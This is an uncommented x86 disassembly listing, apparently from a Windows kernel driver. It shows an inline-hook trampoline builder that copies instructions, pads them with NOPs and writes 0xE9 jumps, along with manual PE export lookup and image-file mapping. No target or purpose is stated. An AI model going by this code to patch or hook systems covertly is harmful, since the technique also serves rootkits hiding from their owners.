   196e7:	int3   
   196e8:	int3   
   196e9:	int3   
   196ea:	mov    edi,edi
   196ec:	push   ebp
   196ed:	mov    ebp,esp
   196ef:	push   ecx
   196f0:	mov    ecx,DWORD PTR [ebp+0x8]
   196f3:	mov    eax,DWORD PTR [ecx+0x4]
   196f6:	mov    edx,DWORD PTR [ebp+0xc]
   196f9:	push   ebx
   196fa:	mov    ebx,DWORD PTR [edx+0x4]
   196fd:	push   esi
   196fe:	push   edi
   196ff:	mov    DWORD PTR [ebp-0x4],eax
   19702:	mov    DWORD PTR [ebp+0x8],eax
   19705:	cmp    eax,ebx
   19707:	jbe    0x1970c
   19709:	mov    DWORD PTR [ebp+0x8],ebx
   1970c:	xor    eax,eax
   1970e:	cmp    DWORD PTR [ebp+0x8],eax
   19711:	jbe    0x19729
   19713:	mov    esi,DWORD PTR [ecx]
   19715:	mov    edi,DWORD PTR [edx]
   19717:	mov    cl,BYTE PTR [esi+eax*1]
   1971a:	mov    dl,BYTE PTR [edi+eax*1]
   1971d:	cmp    cl,dl
   1971f:	jl     0x19736
   19721:	jg     0x1973a
   19723:	inc    eax
   19724:	cmp    eax,DWORD PTR [ebp+0x8]
   19727:	jb     0x19717
   19729:	cmp    DWORD PTR [ebp-0x4],ebx
   1972c:	setb   al
   1972f:	pop    edi
   19730:	pop    esi
   19731:	pop    ebx
   19732:	leave  
   19733:	ret    0x8
   19736:	mov    al,0x1
   19738:	jmp    0x1972f
   1973a:	xor    al,al
   1973c:	jmp    0x1972f
   1973e:	int3   
   1973f:	int3   
   19740:	int3   
   19741:	int3   
   19742:	int3   
   19743:	int3   
   19744:	mov    edi,edi
   19746:	push   ebp
   19747:	mov    ebp,esp
   19749:	mov    eax,DWORD PTR [ebp+0x8]
   1974c:	mov    ecx,DWORD PTR [eax+0x4]
   1974f:	mov    edx,DWORD PTR [ebp+0xc]
   19752:	cmp    ecx,DWORD PTR [edx+0x4]
   19755:	je     0x1975b
   19757:	xor    al,al
   19759:	jmp    0x1976a
   1975b:	push   esi
   1975c:	mov    esi,DWORD PTR [eax]
   1975e:	push   edi
   1975f:	mov    edi,DWORD PTR [edx]
   19761:	xor    eax,eax
   19763:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   19765:	pop    edi
   19766:	sete   al
   19769:	pop    esi
   1976a:	pop    ebp
   1976b:	ret    0x8
   1976e:	int3   
   1976f:	int3   
   19770:	int3   
   19771:	int3   
   19772:	int3   
   19773:	int3   
   19774:	mov    edi,edi
   19776:	push   ebp
   19777:	mov    ebp,esp
   19779:	push   DWORD PTR [ebp+0xc]
   1977c:	push   DWORD PTR [ebp+0x8]
   1977f:	call   0x19744
   19784:	xor    ecx,ecx
   19786:	test   al,al
   19788:	sete   cl
   1978b:	mov    al,cl
   1978d:	pop    ebp
   1978e:	ret    0x8
   19791:	int3   
   19792:	int3   
   19793:	int3   
   19794:	int3   
   19795:	int3   
   19796:	mov    edi,edi
   19798:	push   ebp
   19799:	mov    ebp,esp
   1979b:	push   ecx
   1979c:	mov    ecx,DWORD PTR [ebp+0x8]
   1979f:	mov    eax,DWORD PTR [ebp+0xc]
   197a2:	push   ebx
   197a3:	mov    ebx,DWORD PTR [eax+0x4]
   197a6:	push   esi
   197a7:	push   edi
   197a8:	mov    edi,DWORD PTR [ecx+0x4]
   197ab:	mov    DWORD PTR [ebp-0x4],edi
   197ae:	cmp    edi,ebx
   197b0:	jbe    0x197b4
   197b2:	mov    edi,ebx
   197b4:	and    DWORD PTR [ebp+0x8],0x0
   197b8:	test   edi,edi
   197ba:	jbe    0x197da
   197bc:	mov    eax,DWORD PTR [eax]
   197be:	mov    ecx,DWORD PTR [ecx]
   197c0:	sub    ecx,eax
   197c2:	movzx  edx,WORD PTR [ecx+eax*1]
   197c6:	movzx  esi,WORD PTR [eax]
   197c9:	cmp    dx,si
   197cc:	jb     0x197e7
   197ce:	ja     0x197eb
   197d0:	inc    DWORD PTR [ebp+0x8]
   197d3:	inc    eax
   197d4:	inc    eax
   197d5:	cmp    DWORD PTR [ebp+0x8],edi
   197d8:	jb     0x197c2
   197da:	cmp    DWORD PTR [ebp-0x4],ebx
   197dd:	setb   al
   197e0:	pop    edi
   197e1:	pop    esi
   197e2:	pop    ebx
   197e3:	leave  
   197e4:	ret    0x8
   197e7:	mov    al,0x1
   197e9:	jmp    0x197e0
   197eb:	xor    al,al
   197ed:	jmp    0x197e0
   197ef:	int3   
   197f0:	int3   
   197f1:	int3   
   197f2:	int3   
   197f3:	int3   
   197f4:	mov    edi,edi
   197f6:	push   ebp
   197f7:	mov    ebp,esp
   197f9:	pop    ebp
   197fa:	jmp    0x196ea
   197ff:	int3   
   19800:	int3   
   19801:	int3   
   19802:	int3   
   19803:	int3   
   19804:	mov    edi,edi
   19806:	push   ebp
   19807:	mov    ebp,esp
   19809:	pop    ebp
   1980a:	jmp    0x19744
   1980f:	int3   
   19810:	int3   
   19811:	int3   
   19812:	int3   
   19813:	int3   
   19814:	mov    edi,edi
   19816:	push   ebp
   19817:	mov    ebp,esp
   19819:	pop    ebp
   1981a:	jmp    0x19774
   1981f:	int3   
   19820:	int3   
   19821:	int3   
   19822:	int3   
   19823:	int3   
   19824:	mov    edi,edi
   19826:	push   ebp
   19827:	mov    ebp,esp
   19829:	pop    ebp
   1982a:	jmp    0x19796
   1982f:	int3   
   19830:	int3   
   19831:	int3   
   19832:	int3   
   19833:	int3   
   19834:	mov    edi,edi
   19836:	push   ebp
   19837:	mov    ebp,esp
   19839:	mov    eax,DWORD PTR [ebp+0x8]
   1983c:	mov    cl,BYTE PTR [ebp+0xc]
   1983f:	mov    BYTE PTR [eax],cl
   19841:	inc    eax
   19842:	pop    ebp
   19843:	ret    0x8
   19846:	int3   
   19847:	int3   
   19848:	int3   
   19849:	int3   
   1984a:	int3   
   1984b:	int3   
   1984c:	mov    edi,edi
   1984e:	push   ebp
   1984f:	mov    ebp,esp
   19851:	mov    eax,DWORD PTR [ebp+0x8]
   19854:	mov    ecx,DWORD PTR [ebp+0xc]
   19857:	mov    DWORD PTR [eax],ecx
   19859:	add    eax,0x4
   1985c:	pop    ebp
   1985d:	ret    0x8
   19860:	int3   
   19861:	int3   
   19862:	int3   
   19863:	int3   
   19864:	int3   
   19865:	int3   
   19866:	mov    edi,edi
   19868:	push   ebp
   19869:	mov    ebp,esp
   1986b:	mov    eax,DWORD PTR [ebp+0x8]
   1986e:	mov    cx,WORD PTR [ebp+0xc]
   19872:	mov    WORD PTR [eax],cx
   19875:	add    eax,0x2
   19878:	pop    ebp
   19879:	ret    0x8
   1987c:	int3   
   1987d:	int3   
   1987e:	int3   
   1987f:	int3   
   19880:	int3   
   19881:	int3   
   19882:	mov    edi,edi
   19884:	push   ebp
   19885:	mov    ebp,esp
   19887:	push   esi
   19888:	mov    esi,DWORD PTR [ebp+0x10]
   1988b:	push   edi
   1988c:	mov    edi,DWORD PTR [ebp+0x8]
   1988f:	push   esi
   19890:	push   DWORD PTR [ebp+0xc]
   19893:	push   edi
   19894:	call   0x1dac6
   19899:	add    esp,0xc
   1989c:	lea    eax,[edi+esi*1]
   1989f:	pop    edi
   198a0:	pop    esi
   198a1:	pop    ebp
   198a2:	ret    0xc
   198a5:	int3   
   198a6:	int3   
   198a7:	int3   
   198a8:	int3   
   198a9:	int3   
   198aa:	mov    edi,edi
   198ac:	push   ebp
   198ad:	mov    ebp,esp
   198af:	mov    eax,DWORD PTR [ebp+0xc]
   198b2:	mov    ecx,DWORD PTR [ebp+0x8]
   198b5:	sub    ecx,eax
   198b7:	sub    ecx,0x5
   198ba:	mov    BYTE PTR [eax],0xe9
   198bd:	mov    DWORD PTR [eax+0x1],ecx
   198c0:	add    eax,0x5
   198c3:	pop    ebp
   198c4:	ret    0x8
   198c7:	int3   
   198c8:	int3   
   198c9:	int3   
   198ca:	int3   
   198cb:	int3   
   198cc:	mov    edi,edi
   198ce:	push   ebp
   198cf:	mov    ebp,esp
   198d1:	push   ecx
   198d2:	push   ebx
   198d3:	mov    ebx,DWORD PTR [ebp+0x8]
   198d6:	and    DWORD PTR [ebp+0x8],0x0
   198da:	push   edi
   198db:	mov    edi,ebx
   198dd:	test   ebx,ebx
   198df:	jne    0x198e5
   198e1:	xor    eax,eax
   198e3:	jmp    0x1993f
   198e5:	push   esi
   198e6:	push   0x20736649
   198eb:	push   0x80
   198f0:	push   0x0
   198f2:	call   DWORD PTR ds:0x1f060
   198f8:	mov    esi,eax
   198fa:	mov    DWORD PTR [ebp-0x4],esi
   198fd:	push   0x0
   198ff:	push   edi
   19900:	push   esi
   19901:	call   0x19fe8
   19906:	mov    ecx,eax
   19908:	sub    ecx,edi
   1990a:	add    DWORD PTR [ebp+0x8],ecx
   1990d:	add    esi,ecx
   1990f:	cmp    DWORD PTR [ebp+0x8],0x5
   19913:	mov    edi,eax
   19915:	jb     0x198fd
   19917:	push   DWORD PTR [ebp+0x8]
   1991a:	push   0x90
   1991f:	push   ebx
   19920:	call   0x1daba
   19925:	add    esp,0xc
   19928:	push   esi
   19929:	lea    eax,[ebx+0x5]
   1992c:	push   eax
   1992d:	call   0x198aa
   19932:	push   ebx
   19933:	push   DWORD PTR [ebp+0xc]
   19936:	call   0x198aa
   1993b:	mov    eax,DWORD PTR [ebp-0x4]
   1993e:	pop    esi
   1993f:	pop    edi
   19940:	pop    ebx
   19941:	leave  
   19942:	ret    0x8
   19945:	int3   
   19946:	int3   
   19947:	int3   
   19948:	int3   
   19949:	int3   
   1994a:	mov    edi,edi
   1994c:	push   ebp
   1994d:	mov    ebp,esp
   1994f:	mov    eax,DWORD PTR [ebp+0x8]
   19952:	mov    eax,DWORD PTR [eax+0x1]
   19955:	pop    ebp
   19956:	ret    0x4
   19959:	int3   
   1995a:	int3   
   1995b:	int3   
   1995c:	int3   
   1995d:	int3   
   1995e:	mov    edi,edi
   19960:	push   ebp
   19961:	mov    ebp,esp
   19963:	mov    ecx,DWORD PTR [ebp+0x8]
   19966:	movzx  eax,WORD PTR [ecx+0x14]
   1996a:	lea    eax,[eax+ecx*1+0x18]
   1996e:	movzx  ecx,WORD PTR [ecx+0x6]
   19972:	push   esi
   19973:	xor    esi,esi
   19975:	push   edi
   19976:	test   ecx,ecx
   19978:	jbe    0x19994
   1997a:	mov    edx,DWORD PTR [eax+0xc]
   1997d:	cmp    DWORD PTR [ebp+0xc],edx
   19980:	jb     0x1998c
   19982:	mov    edi,DWORD PTR [eax+0x8]
   19985:	add    edi,edx
   19987:	cmp    DWORD PTR [ebp+0xc],edi
   1998a:	jb     0x19996
   1998c:	add    eax,0x28
   1998f:	inc    esi
   19990:	cmp    esi,ecx
   19992:	jb     0x1997a
   19994:	xor    eax,eax
   19996:	pop    edi
   19997:	pop    esi
   19998:	pop    ebp
   19999:	ret    0x8
   1999c:	int3   
   1999d:	int3   
   1999e:	int3   
   1999f:	int3   
   199a0:	int3   
   199a1:	int3   
   199a2:	mov    edi,edi
   199a4:	push   ebp
   199a5:	mov    ebp,esp
   199a7:	push   esi
   199a8:	push   DWORD PTR [ebp+0xc]
   199ab:	mov    esi,DWORD PTR [ebp+0x8]
   199ae:	push   esi
   199af:	call   0x1995e
   199b4:	mov    ecx,eax
   199b6:	test   ecx,ecx
   199b8:	je     0x199cb
   199ba:	mov    eax,DWORD PTR [esi+0x3c]
   199bd:	dec    eax
   199be:	not    eax
   199c0:	and    eax,DWORD PTR [ecx+0x14]
   199c3:	sub    eax,DWORD PTR [ecx+0xc]
   199c6:	add    eax,DWORD PTR [ebp+0xc]
   199c9:	jmp    0x199ce
   199cb:	mov    eax,DWORD PTR [ebp+0xc]
   199ce:	pop    esi
   199cf:	pop    ebp
   199d0:	ret    0x8
   199d3:	int3   
   199d4:	int3   
   199d5:	int3   
   199d6:	int3   
   199d7:	int3   
   199d8:	mov    edi,edi
   199da:	push   ebp
   199db:	mov    ebp,esp
   199dd:	cmp    DWORD PTR [ebp+0x10],0x0
   199e1:	je     0x199e8
   199e3:	mov    eax,DWORD PTR [ebp+0xc]
   199e6:	jmp    0x199f3
   199e8:	push   DWORD PTR [ebp+0xc]
   199eb:	push   DWORD PTR [ebp+0x8]
   199ee:	call   0x199a2
   199f3:	pop    ebp
   199f4:	ret    0xc
   199f7:	int3   
   199f8:	int3   
   199f9:	int3   
   199fa:	int3   
   199fb:	int3   
   199fc:	mov    edi,edi
   199fe:	push   ebp
   199ff:	mov    ebp,esp
   19a01:	sub    esp,0x1c
   19a04:	push   ebx
   19a05:	push   esi
   19a06:	mov    esi,DWORD PTR [ebp+0x8]
   19a09:	push   edi
   19a0a:	push   esi
   19a0b:	call   0x11884
   19a10:	call   eax
   19a12:	mov    ebx,eax
   19a14:	lea    eax,[ebp-0x14]
   19a17:	push   eax
   19a18:	push   0x0
   19a1a:	push   0x0
   19a1c:	push   esi
   19a1d:	mov    DWORD PTR [ebp-0x4],ebx
   19a20:	call   0x118ae
   19a25:	call   eax
   19a27:	mov    edi,eax
   19a29:	mov    eax,DWORD PTR [ebx+0x50]
   19a2c:	mov    ecx,edi
   19a2e:	sub    ecx,esi
   19a30:	cmp    eax,ecx
   19a32:	jb     0x19a83
   19a34:	mov    ecx,DWORD PTR [ebp-0x14]
   19a37:	sub    ecx,esi
   19a39:	add    ecx,edi
   19a3b:	cmp    eax,ecx
   19a3d:	jb     0x19a83
   19a3f:	push   DWORD PTR [ebp+0x10]
   19a42:	push   DWORD PTR [edi+0x20]
   19a45:	push   ebx
   19a46:	call   0x199d8
   19a4b:	push   DWORD PTR [ebp+0x10]
   19a4e:	mov    ebx,eax
   19a50:	push   DWORD PTR [edi+0x1c]
   19a53:	add    ebx,esi
   19a55:	push   DWORD PTR [ebp-0x4]
   19a58:	call   0x199d8
   19a5d:	push   DWORD PTR [ebp+0x10]
   19a60:	add    eax,esi
   19a62:	push   DWORD PTR [edi+0x24]
   19a65:	mov    DWORD PTR [ebp-0x1c],eax
   19a68:	push   DWORD PTR [ebp-0x4]
   19a6b:	call   0x199d8
   19a70:	and    DWORD PTR [ebp-0xc],0x0
   19a74:	add    eax,esi
   19a76:	mov    esi,DWORD PTR [edi+0x18]
   19a79:	mov    DWORD PTR [ebp-0x18],eax
   19a7c:	mov    DWORD PTR [ebp-0x8],esi
   19a7f:	test   esi,esi
   19a81:	jg     0x19a8f
   19a83:	xor    eax,eax
   19a85:	pop    edi
   19a86:	pop    esi
   19a87:	pop    ebx
   19a88:	leave  
   19a89:	ret    0xc
   19a8c:	mov    esi,DWORD PTR [ebp-0x8]
   19a8f:	mov    eax,DWORD PTR [ebp-0xc]
   19a92:	push   DWORD PTR [ebp+0x10]
   19a95:	add    esi,eax
   19a97:	mov    eax,DWORD PTR [ebp+0xc]
   19a9a:	sar    esi,1
   19a9c:	push   DWORD PTR [ebx+esi*4]
   19a9f:	mov    DWORD PTR [ebp-0x10],eax
   19aa2:	push   DWORD PTR [ebp-0x4]
   19aa5:	call   0x199d8
   19aaa:	add    eax,DWORD PTR [ebp+0x8]
   19aad:	mov    cl,BYTE PTR [eax]
   19aaf:	mov    edx,DWORD PTR [ebp-0x10]
   19ab2:	cmp    cl,BYTE PTR [edx]
   19ab4:	jne    0x19ad1
   19ab6:	test   cl,cl
   19ab8:	je     0x19acd
   19aba:	mov    cl,BYTE PTR [eax+0x1]
   19abd:	cmp    cl,BYTE PTR [edx+0x1]
   19ac0:	jne    0x19ad1
   19ac2:	inc    eax
   19ac3:	inc    eax
   19ac4:	inc    edx
   19ac5:	inc    edx
   19ac6:	mov    DWORD PTR [ebp-0x10],edx
   19ac9:	test   cl,cl
   19acb:	jne    0x19aad
   19acd:	xor    eax,eax
   19acf:	jmp    0x19ad6
   19ad1:	sbb    eax,eax
   19ad3:	sbb    eax,0xffffffff
   19ad6:	test   eax,eax
   19ad8:	je     0x19aef
   19ada:	jge    0x19ae2
   19adc:	inc    esi
   19add:	mov    DWORD PTR [ebp-0xc],esi
   19ae0:	jmp    0x19ae5
   19ae2:	mov    DWORD PTR [ebp-0x8],esi
   19ae5:	mov    eax,DWORD PTR [ebp-0x8]
   19ae8:	cmp    DWORD PTR [ebp-0xc],eax
   19aeb:	jl     0x19a8c
   19aed:	jmp    0x19a83
   19aef:	mov    eax,DWORD PTR [ebp-0x18]
   19af2:	movzx  eax,WORD PTR [eax+esi*2]
   19af6:	mov    ecx,DWORD PTR [ebp-0x1c]
   19af9:	mov    ecx,DWORD PTR [ecx+eax*4]
   19afc:	mov    eax,ecx
   19afe:	sub    eax,edi
   19b00:	add    eax,DWORD PTR [ebp+0x8]
   19b03:	cmp    eax,DWORD PTR [ebp-0x14]
   19b06:	sbb    eax,eax
   19b08:	not    eax
   19b0a:	and    eax,ecx
   19b0c:	jmp    0x19a85
   19b11:	int3   
   19b12:	int3   
   19b13:	int3   
   19b14:	int3   
   19b15:	int3   
   19b16:	mov    edi,edi
   19b18:	push   ebp
   19b19:	mov    ebp,esp
   19b1b:	sub    esp,0x814
   19b21:	mov    eax,ds:0x7e528
   19b26:	xor    eax,ebp
   19b28:	mov    DWORD PTR [ebp-0x4],eax
   19b2b:	mov    ecx,DWORD PTR [ebp+0xc]
   19b2e:	push   ebx
   19b2f:	mov    ebx,DWORD PTR [ebp+0x8]
   19b32:	push   esi
   19b33:	push   edi
   19b34:	xor    esi,esi
   19b36:	xor    eax,eax
   19b38:	push   ecx
   19b39:	mov    DWORD PTR [ebp-0x7ec],esi
   19b3f:	lea    edi,[ebp-0x7e8]
   19b45:	stos   DWORD PTR es:[edi],eax
   19b46:	lea    eax,[ebp-0x7d4]
   19b4c:	push   0x1ec56
   19b51:	push   eax
   19b52:	mov    DWORD PTR [ebp-0x7d8],esi
   19b58:	mov    DWORD PTR [ebp-0x7e4],esi
   19b5e:	call   DWORD PTR ds:0x1f048
   19b64:	add    esp,0xc
   19b67:	lea    eax,[ebp-0x7d4]
   19b6d:	push   eax
   19b6e:	lea    eax,[ebp-0x80c]
   19b74:	push   eax
   19b75:	call   0x11c9e
   19b7a:	call   eax
   19b7c:	push   0x10
   19b7e:	lea    eax,[ebp-0x80c]
   19b84:	mov    DWORD PTR [ebp-0x7fc],eax
   19b8a:	push   0x1
   19b8c:	lea    eax,[ebp-0x814]
   19b92:	push   eax
   19b93:	lea    eax,[ebp-0x804]
   19b99:	push   eax
   19b9a:	push   0x80100000
   19b9f:	lea    eax,[ebp-0x7dc]
   19ba5:	push   eax
   19ba6:	mov    DWORD PTR [ebp-0x804],0x18
   19bb0:	mov    DWORD PTR [ebp-0x800],esi
   19bb6:	mov    DWORD PTR [ebp-0x7f8],esi
   19bbc:	mov    DWORD PTR [ebp-0x7f4],esi
   19bc2:	mov    DWORD PTR [ebp-0x7f0],esi
   19bc8:	call   0x11734
   19bcd:	call   eax
   19bcf:	cmp    eax,esi
   19bd1:	jl     0x19c4f
   19bd3:	push   DWORD PTR [ebp-0x7dc]
   19bd9:	lea    eax,[ebp-0x7ec]
   19bdf:	push   DWORD PTR [ebp+0x10]
   19be2:	push   0x2
   19be4:	push   eax
   19be5:	push   esi
   19be6:	push   0x4
   19be8:	lea    eax,[ebp-0x7e0]
   19bee:	push   eax
   19bef:	call   0x11c20
   19bf4:	call   eax
   19bf6:	push   DWORD PTR [ebp-0x7dc]
   19bfc:	mov    edi,eax
   19bfe:	call   0x11956
   19c03:	call   eax
   19c05:	cmp    edi,esi
   19c07:	jge    0x19c0d
   19c09:	mov    eax,edi
   19c0b:	jmp    0x19c4f
   19c0d:	push   0x2
   19c0f:	push   esi
   19c10:	push   0x2
   19c12:	lea    eax,[ebp-0x7e4]
   19c18:	push   eax
   19c19:	push   esi
   19c1a:	push   esi
   19c1b:	push   esi
   19c1c:	lea    eax,[ebp-0x7d8]
   19c22:	push   eax
   19c23:	push   0xffffffff
   19c25:	push   DWORD PTR [ebp-0x7e0]
   19c2b:	call   0x11bf6
   19c30:	call   eax
   19c32:	push   DWORD PTR [ebp-0x7e0]
   19c38:	mov    edi,eax
   19c3a:	call   0x11956
   19c3f:	call   eax
   19c41:	cmp    edi,esi
   19c43:	jl     0x19c09
   19c45:	mov    eax,DWORD PTR [ebp-0x7d8]
   19c4b:	mov    DWORD PTR [ebx],eax
   19c4d:	xor    eax,eax
   19c4f:	mov    ecx,DWORD PTR [ebp-0x4]
   19c52:	pop    edi
   19c53:	pop    esi
   19c54:	xor    ecx,ebp
   19c56:	pop    ebx
   19c57:	call   0x1da55
   19c5c:	leave  
   19c5d:	ret    0xc
   19c60:	int3   
   19c61:	int3   
   19c62:	int3   
   19c63:	int3   
   19c64:	int3   
   19c65:	int3   
   19c66:	mov    edi,edi
   19c68:	push   ebp
   19c69:	mov    ebp,esp
   19c6b:	push   DWORD PTR [ebp+0x8]
   19c6e:	push   0xffffffff
   19c70:	call   0x11c4a
   19c75:	call   eax
   19c77:	pop    ebp
   19c78:	ret    0x4
   19c7b:	int3   
   19c7c:	int3   
   19c7d:	int3   
   19c7e:	int3   
   19c7f:	int3   
   19c80:	mov    edi,edi
   19c82:	push   ebp
   19c83:	mov    ebp,esp
   19c85:	push   esi
   19c86:	mov    esi,DWORD PTR [ebp+0x8]
   19c89:	test   esi,esi
   19c8b:	jne    0x19c90
   19c8d:	lea    esi,[ecx+0x18]
   19c90:	mov    edx,DWORD PTR [ebp+0xc]
   19c93:	test   edx,edx
   19c95:	jne    0x19c9b
   19c97:	xor    eax,eax
   19c99:	jmp    0x19cab
   19c9b:	movzx  eax,BYTE PTR [edx]
   19c9e:	push   edx
   19c9f:	lea    eax,[eax*8+0x7a640]
   19ca6:	push   esi
   19ca7:	push   eax
   19ca8:	call   DWORD PTR [eax+0x4]
   19cab:	pop    esi
   19cac:	pop    ebp
   19cad:	ret    0x8
   19cb0:	int3   
   19cb1:	int3   
   19cb2:	int3   
   19cb3:	int3   
   19cb4:	int3   
   19cb5:	int3   
   19cb6:	mov    edi,edi
   19cb8:	push   ebp
   19cb9:	mov    ebp,esp
   19cbb:	mov    eax,DWORD PTR [ebp+0x14]
   19cbe:	push   ebx
   19cbf:	mov    ebx,DWORD PTR [ebp+0x8]
   19cc2:	push   esi
   19cc3:	mov    esi,DWORD PTR [ebp+0x10]
   19cc6:	sub    esi,eax
   19cc8:	push   edi
   19cc9:	lea    edi,[ebx+eax*1]
   19ccc:	mov    eax,esi
   19cce:	xor    edx,edx
   19cd0:	dec    eax
   19cd1:	je     0x19cf2
   19cd3:	dec    eax
   19cd4:	je     0x19ce4
   19cd6:	dec    eax
   19cd7:	dec    eax
   19cd8:	jne    0x19cfe
   19cda:	mov    eax,DWORD PTR [ecx+0xc]
   19cdd:	mov    edx,DWORD PTR [edi]
   19cdf:	and    DWORD PTR [eax],0x0
   19ce2:	jmp    0x19cfe
   19ce4:	mov    eax,DWORD PTR [ecx+0xc]
   19ce7:	movsx  edx,WORD PTR [edi]
   19cea:	mov    DWORD PTR [eax],0x2
   19cf0:	jmp    0x19cfe
   19cf2:	mov    eax,DWORD PTR [ecx+0xc]
   19cf5:	movsx  edx,BYTE PTR [edi]
   19cf8:	mov    DWORD PTR [eax],0x3
   19cfe:	mov    ecx,DWORD PTR [ebp+0xc]
   19d01:	lea    eax,[edx+ecx*1]
   19d04:	add    eax,DWORD PTR [ebp+0x10]
   19d07:	sub    edx,ebx
   19d09:	add    edx,ecx
   19d0b:	dec    esi
   19d0c:	je     0x19d1e
   19d0e:	dec    esi
   19d0f:	je     0x19d19
   19d11:	dec    esi
   19d12:	dec    esi
   19d13:	jne    0x19d20
   19d15:	mov    DWORD PTR [edi],edx
   19d17:	jmp    0x19d20
   19d19:	mov    WORD PTR [edi],dx
   19d1c:	jmp    0x19d20
   19d1e:	mov    BYTE PTR [edi],dl
   19d20:	pop    edi
   19d21:	pop    esi
   19d22:	pop    ebx
   19d23:	pop    ebp
   19d24:	ret    0x10
   19d27:	int3   
   19d28:	int3   
   19d29:	int3   
   19d2a:	int3   
   19d2b:	int3   
   19d2c:	mov    edi,edi
   19d2e:	push   ebp
   19d2f:	mov    ebp,esp
   19d31:	mov    eax,DWORD PTR [ebp+0x10]
   19d34:	inc    eax
   19d35:	pop    ebp
   19d36:	ret    0xc
   19d39:	int3   
   19d3a:	int3   
   19d3b:	int3   
   19d3c:	int3   
   19d3d:	int3   
   19d3e:	mov    edi,edi
   19d40:	push   ebp
   19d41:	mov    ebp,esp
   19d43:	mov    eax,ecx
   19d45:	mov    ecx,DWORD PTR [ebp+0x8]
   19d48:	and    DWORD PTR [eax],0x0
   19d4b:	and    DWORD PTR [eax+0x4],0x0
   19d4f:	test   ecx,ecx
   19d51:	jne    0x19d56
   19d53:	lea    ecx,[eax+0x14]
   19d56:	mov    edx,DWORD PTR [ebp+0xc]
   19d59:	mov    DWORD PTR [eax+0x8],ecx
   19d5c:	test   edx,edx
   19d5e:	jne    0x19d63
   19d60:	lea    edx,[eax+0x10]
   19d63:	mov    DWORD PTR [eax+0xc],edx
   19d66:	and    DWORD PTR [ecx],0x0
   19d69:	mov    ecx,DWORD PTR [eax+0xc]
   19d6c:	and    DWORD PTR [ecx],0x0
   19d6f:	pop    ebp
   19d70:	ret    0x8
   19d73:	int3   
   19d74:	int3   
   19d75:	int3   
   19d76:	int3   
   19d77:	int3   
   19d78:	mov    edi,edi
   19d7a:	push   ebp
   19d7b:	mov    ebp,esp
   19d7d:	push   ecx
   19d7e:	mov    eax,DWORD PTR [ebp+0x8]
   19d81:	mov    eax,DWORD PTR [eax]
   19d83:	push   ebx
   19d84:	push   esi
   19d85:	push   edi
   19d86:	mov    DWORD PTR [ebp-0x4],ecx
   19d89:	mov    esi,eax
   19d8b:	test   eax,0x200000
   19d90:	je     0x19d9d
   19d92:	cmp    DWORD PTR [ecx+0x4],0x0
   19d96:	je     0x19da2
   19d98:	shr    esi,0xb
   19d9b:	jmp    0x19da5
   19d9d:	cmp    DWORD PTR [ecx],0x0
   19da0:	jmp    0x19d96
   19da2:	shr    esi,0x8
   19da5:	mov    ebx,DWORD PTR [ebp+0x10]
   19da8:	and    esi,0x7
   19dab:	shr    eax,0xe
   19dae:	and    eax,0x7
   19db1:	mov    edi,esi
   19db3:	jbe    0x19def
   19db5:	add    eax,ebx
   19db7:	mov    cl,BYTE PTR [eax]
   19db9:	movzx  edx,cl
   19dbc:	mov    dl,BYTE PTR [edx+0x7a540]
   19dc2:	test   dl,0x10
   19dc5:	je     0x19de7
   19dc7:	mov    al,BYTE PTR [eax+0x1]
   19dca:	and    al,0x7
   19dcc:	cmp    al,0x5
   19dce:	jne    0x19de7
   19dd0:	and    cl,0xc0
   19dd3:	je     0x19de4
   19dd5:	cmp    cl,0x40
   19dd8:	jne    0x19ddf
   19dda:	lea    edi,[esi+0x1]
   19ddd:	jmp    0x19de7
   19ddf:	cmp    cl,0x80
   19de2:	jne    0x19de7
   19de4:	lea    edi,[esi+0x4]
   19de7:	movzx  eax,dl
   19dea:	and    eax,0xf
   19ded:	add    edi,eax
   19def:	push   edi
   19df0:	push   ebx
   19df1:	push   DWORD PTR [ebp+0xc]
   19df4:	call   0x1dac6
   19df9:	mov    ecx,DWORD PTR [ebp+0x8]
   19dfc:	mov    eax,DWORD PTR [ecx]
   19dfe:	shl    eax,0xc
   19e01:	sar    eax,0x1d
   19e04:	add    esp,0xc
   19e07:	test   eax,eax
   19e09:	je     0x19e25
   19e0b:	push   eax
   19e0c:	push   esi
   19e0d:	mov    esi,DWORD PTR [ebp-0x4]
   19e10:	push   ebx
   19e11:	push   DWORD PTR [ebp+0xc]
   19e14:	mov    ecx,esi
   19e16:	call   0x19cb6
   19e1b:	mov    ecx,DWORD PTR [esi+0x8]
   19e1e:	mov    DWORD PTR [ecx],eax
   19e20:	mov    ecx,DWORD PTR [ebp+0x8]
   19e23:	jmp    0x19e28
   19e25:	mov    esi,DWORD PTR [ebp-0x4]
   19e28:	test   DWORD PTR [ecx],0x400000
   19e2e:	je     0x19e35
   19e30:	mov    eax,DWORD PTR [esi+0xc]
   19e33:	neg    DWORD PTR [eax]
   19e35:	test   DWORD PTR [ecx],0x100000
   19e3b:	je     0x19e43
   19e3d:	mov    eax,DWORD PTR [esi+0x8]
   19e40:	or     DWORD PTR [eax],0xffffffff
   19e43:	lea    eax,[edi+ebx*1]
   19e46:	pop    edi
   19e47:	pop    esi
   19e48:	pop    ebx
   19e49:	leave  
   19e4a:	ret    0xc
   19e4d:	int3   
   19e4e:	int3   
   19e4f:	int3   
   19e50:	int3   
   19e51:	int3   
   19e52:	mov    edi,edi
   19e54:	push   ebp
   19e55:	mov    ebp,esp
   19e57:	push   ebx
   19e58:	push   esi
   19e59:	mov    esi,DWORD PTR [ebp+0x10]
   19e5c:	push   edi
   19e5d:	mov    edi,DWORD PTR [ebp+0xc]
   19e60:	push   esi
   19e61:	push   edi
   19e62:	push   DWORD PTR [ebp+0x8]
   19e65:	mov    ebx,ecx
   19e67:	call   0x19d78
   19e6c:	lea    eax,[esi+0x1]
   19e6f:	movzx  edx,BYTE PTR [eax]
   19e72:	push   eax
   19e73:	inc    edi
   19e74:	lea    edx,[edx*8+0x7a640]
   19e7b:	push   edi
   19e7c:	push   edx
   19e7d:	mov    ecx,ebx
   19e7f:	call   DWORD PTR [edx+0x4]
   19e82:	pop    edi
   19e83:	pop    esi
   19e84:	pop    ebx
   19e85:	pop    ebp
   19e86:	ret    0xc
   19e89:	int3   
   19e8a:	int3   
   19e8b:	int3   
   19e8c:	int3   
   19e8d:	int3   
   19e8e:	mov    edi,edi
   19e90:	push   ebp
   19e91:	mov    ebp,esp
   19e93:	push   ebx
   19e94:	push   esi
   19e95:	mov    esi,DWORD PTR [ebp+0x10]
   19e98:	push   edi
   19e99:	mov    edi,DWORD PTR [ebp+0xc]
   19e9c:	push   esi
   19e9d:	push   edi
